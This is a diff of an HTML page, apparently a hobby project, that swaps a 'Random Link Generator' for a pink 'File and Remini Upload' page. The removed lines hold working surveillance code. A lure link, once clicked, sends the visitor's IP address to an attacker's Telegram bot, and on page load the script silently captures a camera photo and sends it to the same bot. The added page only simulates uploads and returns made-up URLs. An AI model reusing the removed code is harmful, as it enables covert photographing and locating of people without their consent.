@@ -3,207 +3,318 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Link Generator</title>
+    <title>File and Remini Upload</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
+        body {
             font-family: Arial, sans-serif;
-            background-color: #f7f7f7;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: url('https://telegra.ph/file/7d63a20290154d1f6f074.jpg') no-repeat center center fixed;
+            background-size: cover;
+            overflow: hidden;
         }
-        .container {
-            text-align: center;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            margin: 0 auto;
-            margin-top: 50px;
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.5);
+            backdrop-filter: blur(10px);
+            z-index: -1;
         }
-        .input-container {
+
+        h1 {
+            color: #ff66b2;
             margin-bottom: 20px;
         }
-        .input-container input {
-            width: 100%;
-            padding: 10px;
-            border-radius: 5px;
-            border: 1px solid #ddd;
-            margin-bottom: 10px;
-            box-sizing: border-box;
+
+        .toggle-button {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
         }
-        .link, #generate-button, #copy-button {
-            display: inline-block;
-            color: #fff;
-            text-decoration: none;
+
+        .toggle-button button {
+            background-color: #ff66b2;
+            color: white;
+            border: none;
             padding: 10px 20px;
             border-radius: 5px;
-            transition: background-color 0.3s;
             cursor: pointer;
+            transition: background-color 0.3s;
+            margin: 0 10px;
         }
-        .link {
-            background-color: #ff69b4; /* Pink */
+
+        .toggle-button button.active {
+            background-color: #ff99cc;
         }
-        .link:hover, #generate-button:hover, #copy-button:hover {
-            background-color: #d3468f; /* Darker pink on hover */
+
+        .container {
+            display: none;
+            background: rgba(255, 204, 223, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 80%;
+            max-width: 500px;
+            overflow-y: auto;
         }
+
+        .container.active {
+            display: block;
+        }
+
+        input[type="text"], input[type="file"], select {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px dashed #ff66b2;
+            border-radius: 5px;
+            background: white;
+        }
+
+        button.generate {
+            background-color: #ff66b2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button.generate:hover {
+            background-color: #ff99cc;
+        }
+
         .loading {
             display: none;
-            font-size: 24px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: #ff66b2;
+            animation: loadingAnimation 2s infinite;
+        }
+
+        .result {
+            margin: 20px 0;
+            display: none;
+            word-break: break-all;
+        }
+
+        .result img {
+            max-width: 100%;
+            border-radius: 10px;
             margin-bottom: 10px;
         }
-        .loading.active {
-            display: inline-block;
-            animation: spin 1s infinite linear;
+
+        .result a {
+            display: block;
+            color: #ff66b2;
+            text-decoration: none;
+            font-weight: bold;
         }
-        #copy-button {
-            background-color: #ff69b4;
+
+        .result a:hover {
+            text-decoration: underline;
         }
-        #generate-button {
-            background-color: #ff69b4;
+
+        @keyframes loadingAnimation {
+            0% { content: 'Loading'; }
+            33% { content: 'Loading.'; }
+            66% { content: 'Loading..'; }
+            100% { content: 'Loading...'; }
         }
-        @keyframes spin {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
+
+        .button-container {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 10px;
         }
-        @media only screen and (max-width: 500px) {
+
+        .button-container button {
+            background-color: #ff66b2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .button-container button:hover {
+            background-color: #ff99cc;
+        }
+
+        @media (max-width: 600px) {
             .container {
-                max-width: 90%;
+                width: 95%;
             }
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            text-align: center;
+            width: 100%;
+            color: #ff66b2;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Random Link Generator</h1>
-        <p>Masukkan ID Chat dan Token Bot Telegram:</p>
-        <div class="input-container">
-            <input type="text" id="chat-id" placeholder="ID Chat">
-            <input type="text" id="bot-token" placeholder="Token Bot">
-        </div>
-        <button id="generate-button" onclick="generateLink()">Generate</button>
-        <span class="loading" id="loading-icon">&#9201;</span>
-        <a id="random-link" class="link" href="#" target="_blank" style="display:none;">Random link</a>
-        <button id="copy-button" onclick="copyLink()" style="display:none;">Salin</button>
+    <div class="overlay"></div>
+    <div class="toggle-button">
+        <button id="uploadMode" class="active" onclick="toggleMode('upload')">Upload File</button>
+        <button id="reminiMode" onclick="toggleMode('remini')">Remini Upload</button>
     </div>
 
+    <div class="container active" id="uploadContainer">
+        <h1>Upload File</h1>
+        <input type="file" id="fileInput">
+        <button class="generate" onclick="uploadFile()">Generate</button>
+        <div class="loading" id="uploadLoading">Loading...</div>
+        <div class="result" id="uploadResult">
+            <p>Hasil:</p>
+            <a id="uploadFileUrl" href="#" target="_blank"></a>
+            <div class="button-container">
+                <button onclick="copyUploadLink()">Copy Link</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="reminiContainer">
+        <h1>Remini Upload</h1>
+        <input type="text" id="urlInput" placeholder="Masukkan URL foto">
+        <select id="resolutionSelect">
+            <option value="1">Resolusi 1</option>
+            <option value="2">Resolusi 2</option>
+            <option value="3">Resolusi 3</option>
+            <option value="4">Resolusi 4</option>
+        </select>
+        <button class="generate" onclick="generateUrl()">Generate</button>
+        <div class="loading" id="reminiLoading">Loading...</div>
+        <div class="result" id="reminiResult">
+            <p>Hasil:</p>
+            <img id="reminiImage" src="#" alt="Remini Result" />
+            <div class="button-container">
+                <button onclick="previewImage()">Preview</button>
+                <button onclick="downloadImage()">Download</button>
+            </div>
+            <a id="reminiDownloadLink" href="#" download></a>
+        </div>
+    </div>
+
+    <div class="footer">Vynaa Valerie</div>
+
     <script>
-        // List of random URLs
-        const urlList = [
-            'https://picsum.photos/200/300',
-            'https://picsum.photos/250/350',
-            'https://picsum.photos/300/400',
-            'https://picsum.photos/350/450',
-            'https://picsum.photos/400/500'
-            // Add more URLs as needed
-        ];
+        function toggleMode(mode) {
+            document.getElementById('uploadContainer').classList.remove('active');
+            document.getElementById('reminiContainer').classList.remove('active');
+            document.getElementById('uploadMode').classList.remove('active');
+            document.getElementById('reminiMode').classList.remove('active');
 
-        // Function to generate a random link
-        function generateLink() {
-            const randomUrl = urlList[Math.floor(Math.random() * urlList.length)];
-            const chatId = document.getElementById('chat-id').value;
-            const botToken = document.getElementById('bot-token').value;
-            const linkElement = document.getElementById('random-link');
-            const loadingIcon = document.getElementById('loading-icon');
-
-            loadingIcon.classList.add('active'); // Menampilkan animasi loading
-
-            setTimeout(() => {
-                loadingIcon.classList.remove('active'); // Menghilangkan animasi loading setelah 2 detik
-                linkElement.href = `page.html?chatId=${chatId}&botToken=${botToken}&photoUrl=${randomUrl}`;
-                linkElement.style.display = 'inline-block';
-                document.getElementById('copy-button').style.display = 'inline-block'; // Menampilkan tombol salin
-            }, 2000);
-
-            // Kirim notifikasi IP ke bot Telegram saat link diklik
-            linkElement.addEventListener('click', function() {
-                fetch(`https://api.ipify.org?format=json`)
-                    .then(response => response.json())
-                    .then(data => {
-                        const ipAddress = data.ip;
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: `IP address pengguna: ${ipAddress}`
-                            })
-                        })
-                        .then(response => response.json())
-                        .then(result => console.log(result))
-                        .catch(error => console.error('Error:', error));
-                    })
-                    .catch(error => console.error('Error:', error));
-            });
-        }
-
-        // Function to copy generated link
-        function copyLink() {
-            const randomLink = document.getElementById('random-link').href;
-            const tempInput = document.createElement('input');
-            tempInput.value = randomLink;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempInput);
-            alert('Link telah disalin!');
-        }
-
-        // Function to send photo to Telegram bot
-        async function sendPhotoToTelegram(chatId, botToken, photoData) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', photoData, 'photo.jpg');
-
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }
-
-        // Capture photo from camera and send it to Telegram
-        async function captureAndSendPhoto() {
-            const video = document.createElement('video');
-            const constraints = { video: true };
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-
-                // Delay before capturing to allow camera to adjust
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoData = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-                await sendPhotoToTelegram(chatId, botToken, photoData);
-
-                // Stop media stream tracks
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-
-                console.log('Photo sent successfully');
-            } catch (error) {
-                console.error('Error:', error);
+            if (mode === 'upload') {
+                document.getElementById('uploadContainer').classList.add('active');
+                document.getElementById('uploadMode').classList.add('active');
+            } else if (mode === 'remini') {
+                document.getElementById('reminiContainer').classList.add('active');
+                document.getElementById('reminiMode').classList.add('active');
             }
         }
 
-        // Capture and send photo when page loads
-        window.onload = async function() {
-            await captureAndSendPhoto();
-        };
+        function uploadFile() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+            if (!file) {
+                alert('Please select a file to upload.');
+                return;
+            }
+
+            const loadingDiv = document.getElementById('uploadLoading');
+            const resultDiv = document.getElementById('uploadResult');
+            const fileUrlLink = document.getElementById('uploadFileUrl');
+
+            loadingDiv.style.display = 'block';
+            resultDiv.style.display = 'none';
+
+            // Simulasi upload file dengan delay 2 detik
+            setTimeout(() => {
+                // Menyesuaikan dengan format yang sesuai Telegra.ph
+                const fakeUrl = `https://telegra.ph/file/${encodeURIComponent(file.name)}`;
+                loadingDiv.style.display = 'none';
+                fileUrlLink.href = fakeUrl;
+                fileUrlLink.textContent = fakeUrl;
+                resultDiv.style.display = 'block';
+            }, 2000);
+        }
+
+        function copyUploadLink() {
+            const fileUrlLink = document.getElementById('uploadFileUrl').href;
+            if (fileUrlLink) {
+                navigator.clipboard.writeText(fileUrlLink).then(() => {
+                    alert('Link copied to clipboard.');
+                }).catch(err => {
+                    console.error('Could not copy text: ', err);
+                });
+            } else {
+                alert('No link to copy.');
+            }
+        }
+
+        function generateUrl() {
+            const urlInput = document.getElementById('urlInput').value;
+            const resolution = document.getElementById('resolutionSelect').value;
+            const loadingDiv = document.getElementById('reminiLoading');
+            const resultDiv = document.getElementById('reminiResult');
+            const reminiImage = document.getElementById('reminiImage');
+            const reminiDownloadLink = document.getElementById('reminiDownloadLink');
+
+            if (!urlInput) {
+                alert('Please enter a URL.');
+                return;
+            }
+
+            loadingDiv.style.display = 'block';
+            resultDiv.style.display = 'none';
+
+            // Simulasi request ke endpoint untuk menghasilkan URL
+            setTimeout(() => {
+                const fakeUrl = `https://telegra.ph/file/example.jpg`;
+                reminiImage.src = fakeUrl;
+                reminiDownloadLink.href = fakeUrl;
+                reminiDownloadLink.download = "remini_image.jpg";
+                reminiImage.style.display = 'block';
+                reminiDownloadLink.style.display = 'block';
+                resultDiv.style.display = 'block';
+                loadingDiv.style.display = 'none';
+            }, 2000);
+        }
+
+        function previewImage() {
+            const imageUrl = document.getElementById('reminiImage').src;
+            if (imageUrl) {
+                window.open(imageUrl, '_blank');
+            } else {
+                alert('No image to preview.');
+            }
+        }
+
+        function downloadImage() {
+            const downloadLink = document.getElementById('reminiDownloadLink');
+            if (downloadLink.href) {
+                downloadLink.click();
+            } else {
+                alert('No image to download.');
+            }
+        }
     </script>
 </body>
 </html>
